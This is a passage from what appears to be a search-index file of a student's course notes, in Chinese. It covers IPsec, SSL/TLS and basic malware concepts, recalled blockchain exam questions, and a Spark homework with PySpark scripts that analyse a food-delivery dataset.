<p>\u63d0\u4f9b\u6570\u636e\u5b8c\u6574\u6027\u548c\u8ba4\u8bc1\u670d\u52a1\uff0c\u53ef\u4ee5\u6709\u9009\u62e9\u5730\u63d0\u4f9banti-replay \u53cd\u91cd\u653e\u653b\u51fb *</p> <p>\u5177\u4f53\u7684\u7ec6\u8282\u5185\u5bb9\u89c1PPT 37</p> <p>ESP</p> <p>\u63d0\u4f9b\u5b89\u5168\uff0c\u4fdd\u5bc6\u548c\u8ba4\u8bc1\uff08optional\uff09\u7684\u670d\u52a1</p> <p>SA</p> <p>\u7528\u4e8e\u96c6\u6210\u5b89\u5168\u670d\u52a1 integrate security services\uff0c\u5176\u4e2d\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u7b97\u6cd5\u548c\u5e38\u6570\uff08\u5305\u62ec\u5bc6\u94a5\uff09\uff0c\u5bf9\u4e00\u4e2a\u53d1\u9001\u63a5\u53d7\u6d41\u8fdb\u884c\u52a0\u5bc6\u548c\u8ba4\u8bc1\uff0c\u5982\u679c\u9700\u8981\u53cc\u5411\u7684\u5b89\u5168\u901a\u4fe1\uff0c\u90a3\u4e48\u9700\u8981\u4e24\u4e2aSA</p> <p>\u6709\u4e09\u4e2a\u53c2\u6570\u5728SA\u4e2d\u552f\u4e00\u786e\u5b9a</p> <ul> <li>SPI security parameter index</li> <li>IP destination address</li> <li>Securiry protocol identifier  \u5b89\u5168\u534f\u8bae\u6807\u5fd7\uff0c\u786e\u5b9aAH or ESP</li> </ul> <p>\u603b\u4e4b\uff0cSA\u662f\u4e00\u7ec4\u903b\u8f91\u5b89\u5168\u53c2\u6570\uff0c\u80fd\u4e0e\u53e6\u4e00\u4e2a\u5b9e\u4f53\u5171\u4eab\u4fe1\u606f</p> <p>Mode of operation</p> <ul> <li> <p>transport mode</p> </li> <li> <p>\u8be5\u6a21\u5f0f\u4e0b\u4ec5\u4fdd\u62a4IP packet content\u90e8\u5206\uff0c\u4e0d\u4fdd\u62a4IP\u5934\uff0c\u7531\u4e8eIP\u5934\u6ca1\u6709\u88ab\u4fee\u6539\uff0c\u8def\u7531\u8fc7\u7a0b\u4e0d\u4f1a\u88ab\u5f71\u54cd\uff0c\u4f20\u8f93\u5c42\u548c\u5e94\u7528\u5c42\u6570\u636e\u90fd\u53d7\u5230\u4fdd\u62a4\uff0c\u5e38\u7528\u4e8e peer-to-peer \u901a\u4fe1</p> </li> <li> <p>tunnel mode</p> </li> <li> <p>\u8be5\u6a21\u5f0f\u4f1a\u52a0\u5bc6\u548c\u8ba4\u8bc1\u6574\u4e2aIP packet\uff0c\u539f\u59cb\u7684IP packet\u5c06\u4f1a\u88ab\u9690\u85cf\u5230\u65b0\u7684IP packet\uff0c\u5e76\u4e14\u5c06\u9644\u52a0\u65b0\u7684IP\u5934\uff0c\u5e38\u7528\u4e8e\u53d7\u4fdd\u62a4\u7684VPN\uff0chost-to-network, peer-to-peer \u901a\u4fe1\u4e2d</p> </li> </ul> <p>IPsec\u7684\u4f18\u52bf</p> <ul> <li> <p>\u5176\u53ef\u4ee5\u7528\u4e8e\u589e\u5f3a\u548c\u5b9e\u73b0\u9632\u706b\u5899/\u8def\u7531\u5668</p> </li> <li> <p>\u6240\u6709\u901a\u8fc7\u8fb9\u754c\u7684\u6570\u636e\u5305\u7684\u5b89\u5168\u6027\u90fd\u589e\u5f3a\u4e86 security-enhanced</p> </li> <li>\u6536\u9632\u706b\u5899\u4fdd\u62a4\u7684\u4e3b\u673a\u65e0\u9700\u5904\u7406\u5b89\u5168\u95ee\u9898</li> <li> <p>\u5bf9\u4e8e\u6700\u7ec8\u7528\u6237\u662f\u900f\u660e\u7684</p> </li> <li> <p>\u6784\u5efaIPsec\u7f51\u7edc\u4e0a\u5e94\u7528\u7a0b\u5e8f\u65e0\u9700\u505a\u591a\u4f59\u7684\u4e8b\u60c5</p> </li> <li>\u81ea\u52a8\u4fdd\u8bc1\u4fdd\u5bc6\u6027\u548c\u5b8c\u6574\u6027 confidentiality and integrity</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#ssltls","title":"SSL/TLS","text":"<p>TLS \u5c31\u662f\u4f20\u8f93\u5c42\u5b89\u5168\uff0c\u5b83\u7684\u524d\u8eab\u662fSSL\uff0c\u65e8\u5728\u4e3a\u4e86TCP\u5efa\u7acb\u53ef\u9760\u7684end-to-end\u5b89\u5168\u670d\u52a1\uff0c\u5305\u62ecconfidentiality, integrity and authentication</p> <ul> <li> <p>SSL connection</p> </li> <li> <p>\u8fde\u63a5\u662f\u63d0\u4f9b\u9002\u5f53\u7c7b\u578b\u670d\u52a1\u7684\u4f20\u8f93</p> </li> <li>\u662f\u4e00\u4e2apoint-to-point\u7684\u5173\u7cfb\uff0c\u8fde\u63a5\u662f\u4e34\u65f6\u7684\uff0c\u6bcf\u4e2a\u8fde\u63a5\u90fd\u548c\u4e00\u4e2asession\u76f8\u5173\u8054</li> <li> <p>SSL session</p> </li> <li> <p>SSL\u4f1a\u8bdd\u662f\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u5173\u8054\uff0c\u4f1a\u8bdd\u7531\u63e1\u624b\u534f\u8bae\u521b\u5efa\uff0c\u4f1a\u5b9a\u4e49\u4e00\u7ec4\u8fde\u63a5\u5171\u4eab\u7684\u5bc6\u7801\u5b89\u5168\u53c2\u6570</p> </li> <li>\u907f\u514d\u63d0\u4f9b\u5bc6\u7801\u5b89\u5168\u53c2\u6570\u7684\u6602\u8d35\u8c08\u5224\u4ef7\u683c</li> </ul> <p>SSL/TLS protocol stack</p> <p>\u5176\u672c\u8eab\u662f\u5728\u4f20\u8f93\u5c42\u548c\u5e94\u7528\u5c42\u4e4b\u95f4\u7684\uff0c\u81ea\u8eab\u88ab\u5206\u4e3a\u4e24\u5c42</p> <ul> <li> <p>handshake layer</p> </li> <li> <p>\u76f8\u4e92\u9a8c\u8bc1\uff0c\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5b9a\u4e49\u4e86\u4e09\u4e2a\u5b50\u534f\u8bae</p> </li> <li>\u4f7f\u5f97\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u76f8\u4e92\u9a8c\u8bc1</li> <li>\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5\uff0cMAC\u7b97\u6cd5\uff0c\u548c\u52a0\u5bc6\u5bc6\u94a5</li> <li>\u5728\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u4f20\u8f93\u4e4b\u524d\u6267\u884c\u63e1\u624b\u534f\u8bae</li> <li>\u200b\u200b</li> <li> <p>record layer</p> </li> <li> <p>\u63a5\u53d7\u5e76\u52a0\u5bc6\u5e94\u7528\u5c42\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u53d1\u9001\u7ed9\u4f20\u8f93\u5c42</p> </li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#malicious-code","title":"Malicious code","text":"<p>\u6240\u6709\u8fdd\u53cd\u7ad9\u70b9\u5b89\u5168\u7b56\u7565\u7684\u6307\u4ee4\u96c6\u5408</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#trojans-viruses-and-worms","title":"Trojans, Viruses and worms","text":"<p>Trojan horse</p> <p>\u6709\u7740\u516c\u5f00\u76ee\u6807 overt purpose, \u548c\u975e\u516c\u5f00\u76ee\u6807 covert purpose \u7684\u7a0b\u5e8f</p> <p>replicating trojan horse\u662f\u6307\u90a3\u4e9btrojan horse can make copies of itself, \u6728\u9a6c\u7684\u590d\u5236\u662f\u96be\u4ee5\u68c0\u6d4b\u7684</p> <p>\u4f8b\u5982 Thompson's compiler\uff0c\u5c31\u901a\u8fc7\u4fee\u6539\u7f16\u8bd1\u5668\u7684\u62c9\u4e2a</p> <p>trojan horst concealing\u2014\u2014rootkit</p> <p>rootkit \u662f\u4e00\u7ec4\u6728\u9a6c\u7a0b\u5e8f\u7684\u4e8c\u8fdb\u5236\u53ef\u6267\u884c\u4ee3\u7801 \u4e3b\u8981\u7279\u70b9\u662f stealth</p> <p>\u5982\u4f55\u68c0\u6d4b\u548c\u79fb\u9664 rootkit</p> <ul> <li>\u57fa\u4e8e\u884c\u4e3a\uff0c\u7b7e\u540d\uff0c\u5b8c\u6574\u6027\u7b49\u8fdb\u884c\u68c0\u6d4b</li> <li>\u4f7f\u7528\u4e00\u4e9b\u5b89\u5168\u8f6f\u4ef6\u7684\u670d\u52a1\uff0c\u4f7f\u7528\u4e00\u4e2a\u5e72\u51c0\u7684\u6587\u4ef6\u7cfb\u7edf\u6765\u6740\u6728\u9a6c\uff0c\u91cd\u88c5\u7cfb\u7edf</li> </ul> <p>virus</p> <p>\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5c06\u81ea\u8eab\u63d2\u5165\u5176\u4ed6\u7684\u6587\u4ef6\u4e2d\uff0c\u4f7f\u5176\u6709\u5176\u4ed6\u4e0d\u540c\u7684actions</p> <ul> <li>the insertion phase \u8fd9\u4e2a\u9636\u6bb5\u662f\u5fc5\u987b\u6709\u7684</li> <li>the execution phase \u6709\u53ef\u80fd\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u8fd9\u4e2a\u9636\u6bb5\u4e0d\u4e00\u5b9a\u6709</li> </ul> <p>\u6709\u5404\u79cd\u4e0d\u540c\u7684virus\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u4e86\u5176\u4e2d\u51e0\u79cd</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#defense-of-malicious-code","title":"defense of Malicious code","text":"<p>\u867d\u7136\u4e0d\u5b58\u5728\u5b8c\u7f8e\u7684\u7b97\u6cd5\uff0c\u4f46\u662f\u8fd8\u662f\u5b58\u5728\u4e00\u7cfb\u5217means\u53bb\u5904\u7406</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#ddos-spam","title":"\u50f5\u5c38\u7f51\u7edc DDOS SPAM","text":""},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#_4","title":"\u671f\u672b\u590d\u4e60","text":"<ul> <li> <p>\u8ba1\u7b97\u673a\u5b89\u5168</p> </li> <li> <p>\u5bc6\u94a5\u662f\u7ecf\u5e38\u53d8\u7684</p> </li> <li>elements \u5b89\u5168  \u5206\u6790\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u6839\u636e\u8fd9\u51e0\u4e2aelement\u6765\u5206\u6790</li> <li>concept  \u8ba8\u8bba\u5b89\u5168\u7684\u65b9\u9762</li> <li>\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u5f0f\uff0c\u88ab\u5206\u4e3apassive\u548cactive</li> <li> <p>\u5bc6\u7801</p> </li> <li> <p>\u5bc6\u7801\u5b66\u7684\u6982\u5ff5</p> </li> <li>\u516c\u94a5\u5bc6\u7801\u5b66</li> <li>\u79c1\u94a5\u548c\u516c\u94a5\u7684\u533a\u522b</li> <li>\u6570\u5b57\u7b7e\u540d</li> <li> <p>\u8ba4\u8bc1\u548c\u6388\u6743\u8bbf\u95ee\u63a7\u5236</p> </li> <li> <p>\u6982\u5ff5</p> </li> <li> <p>\u7f51\u7edc</p> </li> <li> <p>\u5e38\u89c1\u7684\u653b\u51fb</p> </li> <li>IPSEC</li> <li>TLS/SSL connection\u548csession \u8fde\u63a5\u548c\u5bf9\u8bdd</li> <li>Malicious Code</li> </ul> <p>\u53ef\u4ee5\u56de\u7b54\u82f1\u6587\u5355\u8bcd</p> <p>\u5e94\u7528\uff1a\u5206\u6790\u67d0\u4e2a\u4e1c\u897f\uff0c\u4f1a\u6709\u54ea\u4e9b\u5b89\u5168\u95ee\u9898</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#_5","title":"\u5bf9\u79f0\u5bc6\u94a5\u7684\u95ee\u9898","text":"<ul> <li>\u5176\u95ee\u9898\u5728\u4e8e\u4eba\u4eec\u5fc5\u987b\u8981\u5b89\u5168\u5730\u5171\u4eab\u4e00\u5bf9\u5bc6\u94a5\uff0c\u800c\u8fd9\u4e2a\u5171\u4eab\u5de5\u4f5c\u672c\u8eab\u4e5f\u662f\u9700\u8981\u52a0\u5bc6\u7684</li> <li>\u5e76\u4e14\u5b58\u5728\u5bf9\u79f0\u5bc6\u94a5\u7684\u8bdd\uff0c\u63a5\u6536\u65b9\u4e5f\u53ef\u4ee5\u4f2a\u9020\u6570\u636e\uff0c\u53d1\u9001\u65b9\u65e0\u6cd5\u8bc1\u660e\u81ea\u5df1\u6ca1\u6709\u53d1\u9001\u7ed9\u63a5\u6536\u65b9\uff0c\u56e0\u4e3a\u63a5\u6536\u65b9\u81ea\u5df1\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8be5\u5bc6\u94a5\u521b\u9020\u4fe1\u606f</li> </ul> <p>\u200d</p> <p>\u200d</p>"},{"location":"ZJU-course/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8E%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/","title":"\u671f\u672b\u8003\u8bd5","text":"<p>\u5f00\u5377\uff0c\u4e00\u5f20A4\u7eb8</p> <p>2024 \u671f\u672b</p> <p>\u54c8\u5e0c\u51fd\u6570\u662f\u4ec0\u4e48\uff1fSHA256\u5728\u6bd4\u7279\u5e01\u533a\u5757\u94fe\u4e2d\u6709\u4ec0\u4e48\u5e94\u7528\uff1f</p> <p>\u7ed9\u4e86\u6bd4\u7279\u5e01\u533a\u5757\u5934\u7ed3\u6784\uff0c\u8bf4\u660e\u533a\u5757\u5934\u7684\u5927\u5c0f\u548c\u5b57\u6bb5\u7684\u542b\u4e49\u548c\u4f5c\u7528\u3002</p> <p>\u4ee5\u592a\u574a\u4e2dMTP\u7684\u539f\u7406\uff0c\u7ed9\u51fa\u51e0\u4e2a\u5730\u5740\u548c\u503c\uff0c\u7136\u540e\u6784\u5efa\u51fa\u4e00\u4e2aMPT\u6811\u5b9e\u4f8b\u3002</p> <p>\u4fe1\u6807\u94fe\u4e2d\u5982\u4f55\u6210\u4e3a\u9a8c\u8bc1\u8005\uff1f\u591a\u4e45\u8fdb\u884c\u4e00\u6b21\u5171\u8bc6\u6295\u7968\uff1f\u6295\u7968\u7684\u5305\u542b\u5185\u5bb9\u548c\u539f\u7406\uff1f</p> <p>\u4ee5\u592a\u574a\u4e2d\u5408\u7ea6\u7684\u90e8\u7f72\u548c\u8c03\u7528\u548cFabric\u4e2d\u94fe\u7801\u7684\u90e8\u7f72\u7684\u8c03\u7528\u8fc7\u7a0b\uff1f\u6709\u4ec0\u4e48\u533a\u522b\uff1f</p> <p>Fabric\u4e2dPeer\u8282\u70b9 Orderer\u8282\u70b9\u7684\u4f5c\u7528\uff1f\u8c01\u6267\u884c\u94fe\u7801\uff1f</p> <p>Faric\u4e2d\u5171\u8bc6\u673a\u5236\u7684\u8fc7\u7a0b\u5305\u62ec\u54ea\u4e9b\uff1f\u4f1a\u5206\u53c9\u5417\uff1f\u4e3a\u4ec0\u4e48\uff1f</p> <p>2023 \u671f\u672b</p> <p>\u4ec0\u4e48\u662f\u975e\u5bf9\u79f0\u52a0\u5bc6\u6280\u672f\uff1f\u6709\u4f55\u4f5c\u7528\uff1f \u4ec0\u4e48\u662fMerkle\u6811\uff1f\u5728\u533a\u5757\u94fe\u91cc\u6709\u4f55\u4f5c\u7528\uff1f \u4ec0\u4e48\u662fUTXO\u6a21\u578b\uff1f\u4ee5\u4e0b\u7ed9\u51fa\u533a\u5757\u94fe\u4e2d\u4ea4\u6613\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8bf7\u7b80\u8ff0\u4ea4\u6613\u7684\u521b\u5efa\u548c\u9a8c\u8bc1\u7684\u8fc7\u7a0b \u4ee5\u592a\u574a\u7684\u4e16\u754c\u72b6\u6001\u5305\u62ec\u4ec0\u4e48\uff1f\u600e\u4e48\u6539\u53d8\uff1f\u7528\u4ec0\u4e48\u6570\u636e\u7ed3\u6784\uff1f\u7528\u4ec0\u4e48\u6570\u636e\u5e93\u5b58\u50a8\uff1f \u5982\u4f55\u6210\u4e3a\u4ee5\u592a\u574a\u4e2d\u7684\u9a8c\u8bc1\u8005\uff1f\u6bcf\u4e2avalidator\u591a\u4e45\u6295\u4e00\u6b21\u7968\uff1f\u4e00\u4e2a\u533a\u5757\u591a\u4e45\u53d8\u6210finalized\u72b6\u6001\uff1f Hyperledger Fabric\u4e2d\u7684\u4fe1\u9053\u662f\u4ec0\u4e48\uff1f\u5982\u4f55\u521b\u5efa\uff1f Fabric\u94fe\u7801\u5982\u4f55\u90e8\u7f72\uff1f Fabric\u5171\u8bc6\u9636\u6bb5\u6709\u54ea\u4e9b\uff1f CFT\u548cBFT\u7b97\u6cd5\u533a\u522b\uff1f</p> <p>\u54c8\u5e0c\u51fd\u6570\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u6280\u672f\u7684\u6982\u5ff5\uff0c\u7b2c0\u90e8\u5206\u4f1a\u51fa\u6982\u5ff5\u9898</p> <p>UTXO</p> <p>Fabric\u7684\u94fe\u7801\uff0c\u4fe1\u6807\u94fe\u6295\u7968\uff0cFabric\u7684\u5171\u8bc6\u673a\u5236\uff0cMerkle\u6811\uff0c\u8981\u6df1\u5165\u7406\u89e3</p>"},{"location":"ZJU-course/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8E%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/#a4","title":"A4\u4e0a\u7f3a\u5931\u5f97\u77e5\u8bc6\u70b9","text":"<ul> <li>\u8bfe\u7a0b2\u91cc\u9762\u6709\u4e00\u4e9b\u5b9e\u4f8b</li> <li>\u8bfe\u7a0b5P17 \u516c\u6709\u94fe</li> <li>\u8bfe\u7a0b4\u7684P35</li> <li>\u8fd8\u5269\u4e2d\u95f4\u4e24\u4e2aPPT</li> <li>\u5efa\u7acb\u4e00\u4e2a\u7d22\u5f15</li> </ul> <p>EVM\u5b9a\u4e49 EVM\u662f\u4ee5\u592a\u574a\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u5904\u7406\u667a\u80fd\u5408\u7ea6\u7684\u90e8\u7f72\u548c\u6267\u884c\u3002\u5b9e\u9645\u4e0a\uff0c\u4ece\u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u5230\u53e6\u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u7684\u7b80\u5355\u7684\u4ef7\u503c\u8f6c\u79fb\u4ea4\u6613\u4e0d\u9700\u8981\u6d89\u53ca\u5b83\uff0c\u4f46\u662f\u5176\u4ed6\u6240\u6709\u4e8b\u60c5\u90fd\u5c06\u6d89\u53ca\u7531EVM\u8ba1\u7b97\u7684\u72b6\u6001\u66f4\u65b0\u3002 \u4ee5\u592a\u574a\u533a\u5757\u94fe\u4e0a\u8fd0\u884c\u7684EVM\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5168\u7403\u5206\u6563\u7684\u8ba1\u7b97\u673a\uff0c\u5176\u4e2d\u5305\u542b\u6570\u767e\u4e07\u4e2a\u53ef\u6267\u884c\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u6c38\u4e45\u6570\u636e\u5b58\u50a8\u3002</p> <p>EVM\u5728\u4e00\u4e2a\u66f4\u4e3a\u6709\u9650\u7684\u57df\u4e2d\u8fd0\u884c\uff1a\u5b83\u53ea\u662f\u4e00\u4e2a\u8ba1\u7b97\u5f15\u64ce\uff0c\u56e0\u6b64\u4ec5\u63d0\u4f9b\u4e86\u8ba1\u7b97\u548c\u5b58\u50a8\u7684\u62bd\u8c61\uff0c\u7c7b\u4f3c\u4e8eJava\u865a\u62df\u673a\uff08JVM\uff09\u89c4\u8303\u3002\u4ece\u9ad8\u7ea7\u522b\u7684\u89d2\u5ea6\u6765\u770b\uff0cJVM\u65e8\u5728\u63d0\u4f9b\u4e0e\u5e95\u5c42\u4e3b\u673aOS\u6216\u786c\u4ef6\u65e0\u5173\u7684\u8fd0\u884c\u65f6\u73af\u5883\uff0c\u4ece\u800c\u5b9e\u73b0\u8de8\u591a\u79cd\u7cfb\u7edf\u7684\u517c\u5bb9\u6027\u3002\u8bf8\u5982Java\u6216Scala\uff08\u4f7f\u7528JVM\uff09\u6216C\uff03\uff08\u4f7f\u7528.NET\uff09\u4e4b\u7c7b\u7684\u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00\u88ab\u7f16\u8bd1\u4e3a\u5b83\u4eec\u5404\u81ea\u865a\u62df\u673a\u7684\u5b57\u8282\u7801\u6307\u4ee4\u96c6\u3002\u4ee5\u540c\u6837\u7684\u65b9\u5f0f\uff0cEVM\u6267\u884c\u81ea\u5df1\u7684\u5b57\u8282\u7801\u6307\u4ee4\u96c6\uff08\u5728\u4e0b\u4e00\u8282\u4e2d\u4ecb\u7ecd\uff09\uff0c\u8fd9\u4e9b\u9ad8\u7ea7\u6307\u4ee4\u96c6\u7f16\u7a0b\u8bed\u8a00\uff08\u4f8b\u5982LLL\uff0cSerpent\uff0cMutan\u6216Solidity\uff09\u5c06\u88ab\u7f16\u8bd1\u5230\u5176\u4e2d\u3002</p> <p></p> <p>MPT tree</p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A1%20Spark/","title":"\u4f5c\u4e1a1 Spark","text":""},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A1%20Spark/#1-spark","title":"1. Spark \u5b89\u88c5","text":"<p>\u6211\u9009\u62e9\u5728Ubuntu\uff08Linux\uff09\u7cfb\u7edf\u4e2d\u5b89\u88c5Spark\uff0c\u9996\u5148Wget\u5b89\u88c5\u5305</p> <p>![[Pasted image 20251004200311.png]]</p> <p>\u968f\u540e\u89e3\u538b\uff0c\u5e76\u4e14\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf</p> <p>![[Pasted image 20251004200911.png]]</p> <p>\u968f\u540e\u542f\u52a8\u6210\u529f\uff0c\u5c4f\u5e55\u622a\u56fe\u5982\u4e0b</p> <p>![[Pasted image 20251004200840.png]]</p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A1%20Spark/#2-spark-wordcount","title":"2. Spark WordCount","text":"<p>\u9996\u5148\u6211\u4eec\u4f7f\u7528\u4e00\u884cBash\u547d\u4ee4\u6765\u5904\u7406\u8fd9\u4e2aCSV\u6587\u4ef6\uff0c\u63d0\u53d6\u51fa\u9700\u8981\u7684\u4e00\u884c\uff0c\u4fdd\u5b58\u5728\u4e00\u4e2atxt\u6587\u4ef6\u4e2d</p> <pre><code>tail -n +2 food_delivery.csv | cut -d ',' -f 9 &gt; order_dates.txt\n</code></pre> <p>\u968f\u540e\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff0c\u542f\u52a8 wordcount \u7a0b\u5e8f</p> <pre><code>$SPARK_HOME/bin/spark-submit \\ $SPARK_HOME/examples/src/main/python/wordcount.py \\ order_dates.txt\n</code></pre> <p>\u6700\u7ec8\u7ed3\u679c\u5982\u4e0b</p> <p>![[Pasted image 20251004201612.png]]</p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A1%20Spark/#3-id","title":"3. \u67e5\u627e\u5e74\u9f84\u6700\u5927\u4eba\u5458ID","text":"<p>\u8fd9\u4e2a\u4efb\u52a1\uff0c\u6211\u9009\u62e9\u7528Python\u6765\u8fdb\u884cSpark\u7f16\u7a0b\uff0c\u9996\u5148\u6211\u4eec\u9700\u8981\u4e0b\u8f7dPySpark\u5305\uff0c\u76f4\u63a5\u4f7f\u7528pip install</p> <p>\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from pyspark.sql import SparkSession\nfrom pyspark.sql.functions import col, max, trim\n\nspark = SparkSession.builder.appName(\"FindOldestDeliveryPerson\").getOrCreate()\n\nfile_path = \"food_delivery.csv\" # \u9700\u8981\u5904\u7406\u7684\u6587\u4ef6\n\ndf = spark.read.csv(file_path, header=True, inferSchema=True) # \u8bfb\u53d6csv\n\n# \u6e05\u6d17\u6570\u636e\ndf_clean = (\n\u00a0 \u00a0 df\n\u00a0 \u00a0 .withColumn(\"Delivery_person_Age\", trim(col(\"Delivery_person_Age\")))\n\u00a0 \u00a0 .dropna(subset=[\"Delivery_person_Age\"])\n\u00a0 \u00a0 .withColumn(\"Age_Int\", col(\"Delivery_person_Age\").cast(\"float\").try_cast(\"int\"))\n\u00a0 \u00a0 .dropna(subset=[\"Age_Int\"])\n)\n\nmax_age = df_clean.agg(max(\"Age_Int\")).collect()[0][0] # \u67e5\u627e\u6700\u5927\u5e74\u9f84\n\n# \u627e\u51fa\u5e74\u9f84\u7b49\u4e8e\u6700\u5927\u5e74\u9f84\u7684\u914d\u9001\u4eba\u5458ID\noldest_drivers_df = (\n\u00a0 \u00a0 df_clean.filter(col(\"Age_Int\") == max_age)\n\u00a0 \u00a0 .select(\"Delivery_person_ID\", \"Age_Int\")\n\u00a0 \u00a0 .distinct()\n\u00a0 \u00a0 .orderBy(col(\"Delivery_person_ID\"))\n\n)\n# \u6253\u5370\u7ed3\u679c\nprint(\"\\n\" + \"=\"*50)\nprint(f\"\u4efb\u52a1\u7ed3\u679c\uff1a\u5e74\u9f84\u6700\u5927\u7684\u914d\u9001\u4eba\u5458ID\uff08\u6700\u5927\u5e74\u9f84\uff1a{max_age}\uff09\")\nprint(\"=\"*50)\ntotal_rows = oldest_drivers_df.count()\noldest_drivers_df.show(total_rows, truncate=False)\nprint(\"=\"*50 + \"\\n\")\n\nspark.stop()\n</code></pre> <p>\u7528spark-submit\u6765\u8fd0\u884c\u4e0a\u8ff0\u7a0b\u5e8f\uff0c\u4ee3\u7801\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b</p> <p></p> <p></p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A1%20Spark/#4","title":"4. \u7edf\u8ba1\u5e73\u5747\u7684\u5916\u5356\u65f6\u95f4","text":"<p>\u7f16\u5199\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from pyspark.sql import SparkSession\nfrom pyspark.sql.functions import col, avg, to_date, year, month, split\nspark = SparkSession.builder.appName(\"AverageDeliveryTimeMarch2022\").getOrCreate()\n\nfile_path = \"food_delivery.csv\"\ndf = spark.read.csv(file_path, header=True, inferSchema=True) # \u5b9a\u4e49\u5904\u7406\u6587\u4ef6\n\n# \u6570\u636e\u6e05\u6d17\u4e0e\u8f6c\u6362\ndf_transformed = df.withColumn(\n\u00a0 \u00a0 \"OrderDate\",\n\u00a0 \u00a0 to_date(col(\"Order_Date\"), \"dd-MM-yyyy\")\n).withColumn(\n\u00a0 \u00a0 \"TimeInMinutes\",\n\u00a0 \u00a0 split(col(\"Time_taken(min)\"), ' ')[1].cast(\"int\")\n)\n\n# \u627e\u51fa2022\u5e743\u6708\u4efd\u7684\u8ba2\u5355\nmarch_2022_orders_df = df_transformed.filter(\n\u00a0 \u00a0 (year(col(\"OrderDate\")) == 2022) &amp; (month(col(\"OrderDate\")) == 3)\n)\n\n# \u8ba1\u7b97\u5e73\u5747\u914d\u9001\u65f6\u95f4\navg_time_df = march_2022_orders_df.dropna(subset=[\"TimeInMinutes\"]).agg(\n\u00a0 \u00a0 avg(\"TimeInMinutes\").alias(\"average_delivery_time\")\n)\n\n# \u63d0\u53d6\u5e76\u6253\u5370\u7ed3\u679c\naverage_time = avg_time_df.collect()[0]['average_delivery_time']\n\nprint(\"\\n\" + \"=\"*60)\nprint(f\"\u4efb\u52a1\u7ed3\u679c\uff1a2022\u5e743\u6708\u4efd\u7684\u5916\u5356\u8ba2\u5355\u5e73\u5747\u914d\u9001\u65f6\u95f4\u4e3a: {average_time:.2f} \u5206\u949f\")\nprint(\"=\"*60 + \"\\n\")\nspark.stop()\n</code></pre> <p>\u5b9e\u9a8c\u7ed3\u679c\u622a\u56fe\u5982\u4e0b</p> <p>![[Pasted image 